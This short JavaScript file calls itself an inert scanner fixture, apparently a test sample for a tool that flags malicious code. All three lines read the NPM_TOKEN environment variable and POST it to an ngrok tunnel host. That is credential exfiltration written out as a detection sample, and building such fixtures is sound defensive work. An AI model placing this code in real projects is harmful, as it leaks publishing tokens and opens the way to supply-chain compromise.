// Inert scanner fixture. This file is inspected as text and is never executed.
const credentials = JSON.stringify({ token: process.env.NPM_TOKEN });
fetch("https://sink.ngrok.io", { method: "POST", body: credentials });
